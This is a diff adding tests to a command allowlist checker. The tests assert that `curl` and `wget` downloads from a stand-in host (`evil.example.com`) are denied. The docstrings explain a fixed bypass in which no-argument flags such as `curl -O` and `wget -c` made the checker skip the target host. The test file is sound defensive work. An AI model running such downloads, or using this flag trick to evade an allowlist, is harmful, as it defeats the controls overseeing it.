@@ -85,3 +85,30 @@ def test_config_flag_value_is_not_skipped():
     value stays host-matched (over-blocks the filename — safe direction —
     rather than blessing an opaque config). (security review on #847)"""
     assert _decide("curl -K some.config.txt https://api.github.com/x") == "deny"
+
+
+def test_curl_dash_O_does_not_skip_target_host():
+    """curl's -O (--remote-name) takes NO argument — it must not consume the
+    request target. `curl -O evil.com` had bypassed the check when -O was
+    wrongly in the value-flag set (Devin #847). The target stays checked."""
+    assert _decide("curl -O evil.example.com") == "deny"
+    assert _decide("curl -O https://evil.example.com/x") == "deny"
+    # an allowlisted target with -O is still allowed
+    assert _decide("curl -O https://api.github.com/x") == "allow"
+
+def test_wget_noarg_short_flags_do_not_skip_target():
+    """wget's `-c`/`-b`/`-F`/`-E`/`-m` take NO argument (unlike the same curl
+    letters), so a shared value-flag set made `wget -c evil.com` skip the
+    target and bypass the allowlist. The per-tool set fixes the whole class
+    (security audit follow-up on #848)."""
+    for flag in ("-c", "-b", "-F", "-E", "-m"):
+        assert _decide(f"wget {flag} evil.example.com") == "deny", flag
+
+
+def test_per_tool_value_flags_still_skip_legit_values():
+    """The per-tool sets must not reintroduce the #847 false-denials: a
+    value-flag of the invoked tool still skips its dotted value."""
+    assert _decide("curl -b cookies.example.jar https://api.github.com/x") == "allow"
+    assert _decide("curl -m 30 https://api.github.com/x") == "allow"
+    assert _decide("wget -O out.example.bin https://api.github.com/x") == "allow"
+    assert _decide("wget -t 3 https://api.github.com/x") == "allow"
